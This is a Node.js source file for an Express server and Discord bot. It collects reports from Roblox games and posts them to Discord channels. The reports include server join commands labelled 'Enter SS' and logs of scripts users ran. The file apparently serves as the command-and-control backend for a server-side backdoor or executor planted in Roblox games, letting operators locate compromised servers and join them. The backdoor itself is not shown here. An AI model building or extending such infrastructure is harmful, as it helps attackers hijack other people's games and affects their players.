const express = require("express");
const dotenv = require('dotenv').config()
const bodyParser = require('body-parser');
const token = process.env['TOKEN'];
const { Client, GatewayIntentBits, Events, EmbedBuilder } = require('discord.js');
const Cookies = process.env["Cookie"];
const axios = require('axios');
const fs = require("fs"); 
const blacklist = require("./blacklist.json");
const prefix=";";

let app = express();
let debounce = true;
let debounceScript = true;


const client = new Client({
    intents: [
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildBans,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ]
});

function timeout(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

app.use(bodyParser.json());

app.use(bodyParser.urlencoded({
    extended: true
}));

app.get('/api', function(req, res) {
    res.end("{}")
});

// Username:Str | Code:Str | UserId:Num | http:Bool
app.post("/api/scriptlog", async function(req, res) {
	if(!debounceScript) {
		while (!debounceScript) {
			await timeout(1000);
		}
	}
	debounceScript = false;
	let json = req.body;
	
	if (json !== undefined && json.Code) {
		let embed = new EmbedBuilder()
		.setColor(0x06f5f5)
		.setTitle(`${json.Username ?? "Nulls"}'s Script`)
		.setDescription(`\`${json.Code ?? "[Spoofed Code]"}\``)
		.setFooter({ text: 'XrayZoneS is the best!' })
		.setURL(`https://www.roblox.com/users/${json.UserId}/profile`);
		
		const channel = client.channels.cache.get('1206439016854196254');
		
		if(channel) {
			channel.send({ content:`${json.http ? "http" : "nonhttp"}`, embeds: [embed] });
		}
		res.end("200");
	} else {res.end("404")}
	setTimeout(function() {
		debounceScript = true;
	}, 4000);
})

// PlaceId:Num | Name:Str | Players:Num | MaxPlayers:Num | JobId:Str | CID:Num
app.post('/api/log', function(req, res) {
	if(!debounce) {res.end("{}")}
	debounce = false;
    let imageid = "https://t3.rbxcdn.com/d400d4f9964922d9bd5c7aff88835730";
    //let useragent = req.get("user-agent")
    //if(useragent != "Roblox/Linux"){
    //  res.end("{}")
    //}
    let json = req.body;
	if(json.PlaceId === undefined || json.CID === undefined || json.Name === undefined || json.Players === undefined || json.MaxPlayers === undefined
		|| json.JobId === undefined) {
		console.log(json);
		console.log("data missing");
		return res.end("{}");
	}
	if (blacklist.includes(json.PlaceId.toString())) {
		console.log("place is blacklisted");
		res.end("blacklisted");
		return;
	}

    function SetUniverse(d) {
        return axios.get(`https://games.roblox.com/v2/users/${json.CID}/games?accessFilter=Public&sortOrder=Asc&limit=50`)
            .then(response => {
                var global = null;
                let r = response.data.data
                for(let key in r){
                    global = r[key].id
                    if(r[key].rootPlace.id == json.PlaceId){
                        return global
                    }
                }
                return null
            })
            .catch(function(error) {
                console.log(error)
                return null
            });
    };

    function SetVisit(d) {
        return axios.get(`https://games.roblox.com/v1/games?universeIds=` + d)
            .then(response => {

                return response.data.data[0].visits
            }).catch(function(error) {
                return 0
            });
    };

    function SetTP(d) {
        return axios.get(`https://games.roblox.com/v1/games?universeIds=` + d)
            .then(response => {
                return response.data.data[0].playing
            }).catch(function(error) {
                return 0
            });
    };

    function SetImage(d) {
        return axios.get(`https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds=` + d + `&defaults=true&size=768x432&format=Png&isCircular=false`).then(response => {
            return response.data.data[0].thumbnails[0].imageUrl
        }).catch(function(error) {
            return imageid
        });
    };

    SetUniverse(json.PlaceId).then(response => {
        console.log(response)
        if (response === null) {
            res.end("404");
            return
        }
        SetVisit(response).then(visits => {
            SetTP(response).then(totalplrs => {
				//if(totalplrs<3){res.end("{}")};
                SetImage(response).then(imageid => {
					let embed = new EmbedBuilder()
					.setColor(2723327)
					.setTitle("Game Logged - Enter SS")
					.addFields(
						{
							"name": "URL",
							"value": `[Click here](https://www.roblox.com/games/${json.PlaceId})`,
							"inline": true
						},
						{
							"name": "Place ID",
							"value": `${json.PlaceId}`,
							"inline": true
						},
						{
							"name": "Name",
							"value": json.Name
						},
						{
							"name": "Players",
							"value": `${json.Players}/${json.MaxPlayers}`,
							"inline": true
						},
						{
							"name": "Total Players",
							"value": `${totalplrs}`,
							"inline": true
						},
						{
							"name": "Visits",
							"value": `${visits}`
						},
						{
							"name": "Server Join Code (execute inside of your browsers console)",
							"value": `\`Roblox.GameLauncher.joinGameInstance(${json.PlaceId}, "${json.JobId}")\``
						}
					)
					.setImage(`${imageid}`);
                    

					if(json.http === true){
						const channel = client.channels.cache.get('1206321391213744178');
						if(channel) {
							channel.send({ content:"XrayZoneS is cool!", embeds: [embed] });
						}
					}else if(json.http === false) {
						const channel = client.channels.cache.get('1206321417377939526');
						if(channel) {
							channel.send({ content:"XrayZoneS is cool!", embeds: [embed] });
						}
					}
					res.end("200");
                })
            })
        })
    })
	setTimeout(function() {
		debounce = true;
	}, 15000);
});

client.on('messageCreate', message => {
	if (message.content.startsWith(prefix)) {
		let msgArray = message.content.split(" ");
		let command = msgArray[0].replace(prefix, "");
		let args = msgArray.slice(1);
		if(command === "blacklist") {
			if (message.member.roles.cache.some(role => role.id === '1206321277355298887')) {
				if(args[0]) {
					blacklist.push(args[0])
					var newData = JSON.stringify(blacklist); 
					fs.writeFile("blacklist.json", newData, (err) => { 
						// Error checking 
						if (err) throw err; 
						message.reply("Data added")
					}); 
				}
			}
		} else if(command==="unblacklist") {
			if (message.member.roles.cache.some(role => role.id === '1206321277355298887')) {
				if(args[0]) {
					if (blacklist.includes(args[0])) {
						const index = blacklist.indexOf(args[0]);
						blacklist.splice(index, 1);
						//blacklist.push(args[0])
						var newData = JSON.stringify(blacklist); 
						fs.writeFile("blacklist.json", newData, (err) => { 
							// Error checking 
							if (err) throw err; 
							message.reply("Data written")
						}); 
					}
				}
			}
		}
	}
});

app.listen(8604, () => console.log(`App is listening at http://localhost:8604`));

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.login(token);